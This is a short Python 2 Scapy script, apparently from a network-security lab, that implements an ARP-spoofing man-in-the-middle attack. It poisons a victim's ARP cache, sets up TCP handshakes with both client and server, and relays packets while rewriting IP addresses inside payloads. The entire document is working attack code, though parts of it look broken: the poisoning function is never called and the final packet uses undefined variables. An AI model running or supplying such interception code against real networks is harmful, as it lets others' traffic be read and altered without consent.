from scapy.all import *

def ARPPoison(macAttacker, macVictim, ipToSpoof, ipVictim):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp)

def forward(p):
    print p.summary()
    if p[IP].src == ipToSpoof:
        ipLayerC.type = p.type
        ipLayerC.version = p.version
        ipLayerC.ihl = p.ihl
        ipLayerC.tos = p.tos
        ipLayerC.len = p.len
        ipLayerC.id = p.id
        ipLayerC.flags = p.flags
        ipLayerC.frag = p.frag
        ipLayerC.ttl = p.ttl
        ipLayerC.proto = p.proto
        send(ipLayerC / p[TCP])
    elif p[IP].src == ipVictim:
        ipLayerS.type = p.type
        ipLayerS.version = p.version
        ipLayerS.ihl = p.ihl
        ipLayerS.tos = p.tos
        ipLayerS.len = p.len
        ipLayerS.id = p.id
        ipLayerS.flags = p.flags
        ipLayerS.frag = p.frag
        ipLayerS.ttl = p.ttl
        ipLayerS.proto = p.proto
        try:
            tcpLayer = p[TCP]
            tcpLayer.load = tcpLayer.load.replace(ipSelf, ipToSpoof)
            send(ipLayerS / tcpLayer)
        except AttributeError:
            send(ipLayerS / p[TCP])
        

ipToSpoof = "192.168.56.102"
ipSelf = "192.168.56.103"
macSelf = "08:00:27:32:f4:6a"
macVictim = "08:00:27:b0:a1:ab"

print "Listening as " + ipSelf

# Start TCP handshake with client
a = sniff(count = 1, filter = "tcp and port 80 and host " + ipSelf)
ipVictim = a[0][IP].src
port = a[0].sport
print "Connection from " + ipVictim + ":" + str(port)

# TCP handshake with server
ipLayerS = IP(src = ipSelf, dst = ipToSpoof)
tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = a[0].seq)
answer = sr1(ipLayerS / tcpLayer)
tcpLayer = TCP(sport = port, dport = 80, flags = "A", seq = answer.ack, ack = answer.seq + 1)
send(ipLayerS / tcpLayer)
print "Handshake 2 completed"
print "---------------------"

# Finish TCP handshake with client
ipLayerC = IP(src = ipSelf, dst = ipVictim)
synAck = TCP(sport = 80, dport = port, flags = "SA", seq = answer.seq, ack = a[0].seq + 1)
print sr1(ipLayerC / synAck).summary()
print "Handshake 1 completed"
print "---------------------"

sniff(filter = "tcp and host " + ipSelf, prn = forward)

tcpLayer = TCP(sport = 80, dport = port, flags = "FA", seq = seq, ack = ack, options = [('MSS', 1460)])
send(ipLayerC / tcpLayer)
